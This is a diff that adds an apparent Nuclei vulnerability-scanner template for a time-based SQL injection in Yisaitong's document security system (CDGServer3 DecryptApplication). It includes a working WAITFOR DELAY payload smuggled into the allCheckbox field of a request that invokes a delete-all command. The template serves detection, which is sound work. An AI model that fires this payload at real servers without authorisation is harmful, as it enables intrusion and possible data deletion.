@@ -1,0 +1,39 @@
+id: yisaitong-DecryptApplication-allCheckbox-sqli
+
+info:
+  name: 亿赛通-电子文档安全管理系统 DecryptApplication的allCheckbox存在SQL注入漏洞
+  author: yisaitong
+  severity: high
+  tags: yisaitong
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        allCheckbox=1&fromurl=DeletedDecryptApplication2.jsp&command=DelAllDecryptApplication
+
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        allCheckbox=1'WAITFOR+DELAY'0%3a0%3a4'--&fromurl=DeletedDecryptApplication2.jsp&command=DelAllDecryptApplication
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: dsl
+        dsl:
+          - 'duration_2 >= 4'
+          - 'duration_1 < 2'
+          - 'duration_2 < 10'
+          - 'len(body) < 10'
+        condition: and
+
